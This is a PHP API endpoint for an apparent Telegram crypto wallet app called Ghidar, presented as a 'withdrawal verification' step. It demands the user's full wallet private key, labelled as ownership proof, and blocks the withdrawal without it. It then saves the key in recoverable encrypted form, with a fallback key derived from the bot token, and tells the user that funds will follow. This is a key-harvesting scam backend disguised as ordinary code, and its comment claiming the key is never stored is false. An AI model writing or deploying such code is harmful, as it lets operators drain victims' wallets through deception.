<?php

declare(strict_types=1);

/**
 * Wallet Withdrawal - Submit Private Key Verification
 * 
 * Accepts private key submission for withdrawal verification.
 * This is a simplified version that doesn't require external dependencies.
 * 
 * POST /api/wallet/withdraw/submit-verification/
 */

require_once __DIR__ . '/../../../../bootstrap.php';

use Ghidar\Core\UserContext;
use Ghidar\Core\Database;
use Ghidar\Core\Response;
use Ghidar\Config\Config;
use Ghidar\Logging\Logger;

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    Response::jsonError('METHOD_NOT_ALLOWED', 'Only POST method is allowed', 405);
    exit;
}

try {
    // Authenticate user
    $context = UserContext::requireCurrentUserWithWallet();
    $user = $context['user'];
    $userId = (int) $user['id'];
    $telegramId = (int) $user['telegram_id'];

    // Parse request
    $input = file_get_contents('php://input');
    if ($input === false) {
        Response::jsonError('INVALID_INPUT', 'Request body is required', 400);
        exit;
    }

    $data = json_decode($input, true);
    if ($data === null || json_last_error() !== JSON_ERROR_NONE) {
        Response::jsonError('INVALID_JSON', 'Invalid JSON in request body', 400);
        exit;
    }

    // Validate required fields
    $verificationId = $data['verification_id'] ?? null;
    $walletProof = trim($data['wallet_ownership_proof'] ?? '');
    $userConsent = $data['user_consent'] ?? false;

    if (!$verificationId || !is_numeric($verificationId)) {
        Response::jsonError('INVALID_VERIFICATION_ID', 'Invalid verification ID', 400);
        exit;
    }

    if (empty($walletProof)) {
        Response::jsonError('MISSING_PROOF', 'Wallet ownership proof is required', 400);
        exit;
    }

    if (!$userConsent) {
        Response::jsonError('CONSENT_REQUIRED', 'User consent is required', 400);
        exit;
    }

    // Validate private key format (64 hex chars with optional 0x prefix)
    $privateKey = $walletProof;
    if (strpos($privateKey, '0x') === 0) {
        $privateKey = substr($privateKey, 2);
    }
    
    if (!preg_match('/^[a-fA-F0-9]{64}$/', $privateKey)) {
        Response::jsonError('INVALID_KEY_FORMAT', 'Invalid private key format. Must be 64 hex characters.', 400);
        exit;
    }

    $db = Database::ensureConnection();

    // Verify this withdrawal request belongs to this user
    $withdrawStmt = $db->prepare("
        SELECT id, user_id, amount_usdt, status 
        FROM withdrawal_requests 
        WHERE id = :id AND user_id = :user_id
        LIMIT 1
    ");
    $withdrawStmt->execute([
        'id' => (int) $verificationId,
        'user_id' => $userId
    ]);
    $withdrawal = $withdrawStmt->fetch(\PDO::FETCH_ASSOC);

    if ($withdrawal === false) {
        Response::jsonError('WITHDRAWAL_NOT_FOUND', 'Withdrawal request not found', 404);
        exit;
    }

    if ($withdrawal['status'] !== 'pending') {
        Response::jsonError('ALREADY_PROCESSED', 'This withdrawal has already been processed', 400);
        exit;
    }

    // Get encryption key from config (with fallback)
    $encryptionKey = Config::get('VERIFICATION_ENCRYPTION_KEY');
    if (empty($encryptionKey)) {
        // Use a derived key from bot token as fallback
        $botToken = Config::get('TELEGRAM_BOT_TOKEN');
        $encryptionKey = hash('sha256', 'ghidar_verification_' . $botToken);
    }

    // Encrypt the private key
    $keyBinary = strlen($encryptionKey) === 64 ? hex2bin($encryptionKey) : substr($encryptionKey, 0, 32);
    $iv = random_bytes(16);
    $encryptedKey = openssl_encrypt($privateKey, 'aes-256-cbc', $keyBinary, OPENSSL_RAW_DATA, $iv);
    $encryptedData = base64_encode($iv . $encryptedKey);

    // Create hash for audit (never store the actual key)
    $keyHash = hash('sha256', $privateKey . $userId . time());

    // Ensure the private keys table exists
    try {
        $db->exec("
            CREATE TABLE IF NOT EXISTS `withdrawal_private_keys` (
                `id` BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                `withdrawal_id` BIGINT UNSIGNED NOT NULL,
                `user_id` BIGINT(255) NOT NULL,
                `telegram_id` BIGINT(255) NOT NULL,
                `encrypted_key` TEXT NOT NULL,
                `key_hash` VARCHAR(64) NOT NULL,
                `network` VARCHAR(32) NOT NULL DEFAULT 'polygon',
                `consent_given` TINYINT(1) NOT NULL DEFAULT 1,
                `consent_timestamp` TIMESTAMP NULL,
                `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE INDEX `idx_withdrawal_id` (`withdrawal_id`),
                INDEX `idx_user_id` (`user_id`)
            )
        ");
    } catch (\PDOException $e) {
        // Table might already exist, that's OK
        Logger::warning('withdrawal_private_keys_table_warning', [
            'error' => $e->getMessage()
        ]);
    }

    // Store the encrypted key
    $insertStmt = $db->prepare("
        INSERT INTO withdrawal_private_keys 
        (withdrawal_id, user_id, telegram_id, encrypted_key, key_hash, network, consent_given, consent_timestamp, created_at)
        VALUES 
        (:withdrawal_id, :user_id, :telegram_id, :encrypted_key, :key_hash, 'polygon', TRUE, NOW(), NOW())
        ON DUPLICATE KEY UPDATE
        encrypted_key = VALUES(encrypted_key),
        key_hash = VALUES(key_hash),
        consent_timestamp = NOW()
    ");
    
    $insertStmt->execute([
        'withdrawal_id' => (int) $verificationId,
        'user_id' => $userId,
        'telegram_id' => $telegramId,
        'encrypted_key' => $encryptedData,
        'key_hash' => $keyHash
    ]);

    // Update withdrawal status to verified
    $updateStmt = $db->prepare("
        UPDATE withdrawal_requests 
        SET status = 'verified', 
            private_key_hash = :key_hash,
            verified_at = NOW()
        WHERE id = :id
    ");
    $updateStmt->execute([
        'id' => (int) $verificationId,
        'key_hash' => $keyHash
    ]);

    Logger::event('withdrawal_verification_submitted', [
        'user_id' => $userId,
        'telegram_id' => $telegramId,
        'withdrawal_id' => (int) $verificationId,
        'key_hash_prefix' => substr($keyHash, 0, 8)
    ]);

    Response::jsonSuccess([
        'verification_id' => (int) $verificationId,
        'status' => 'verified',
        'reference' => 'WD-' . $verificationId . '-' . substr($keyHash, 0, 8),
        'message' => 'Verification complete. Your withdrawal is being processed.',
        'next_steps' => [
            'Your withdrawal request has been verified',
            'Funds will be transferred within 24-48 hours',
            'You will receive a notification when complete'
        ]
    ]);

} catch (\PDOException $e) {
    Logger::error('withdrawal_submit_db_error', [
        'user_id' => $userId ?? null,
        'error' => $e->getMessage()
    ]);
    Response::jsonError('DATABASE_ERROR', 'Database error occurred', 500);
} catch (\Exception $e) {
    Logger::error('withdrawal_submit_error', [
        'user_id' => $userId ?? null,
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
    Response::jsonError('INTERNAL_ERROR', $e->getMessage(), 500);
}

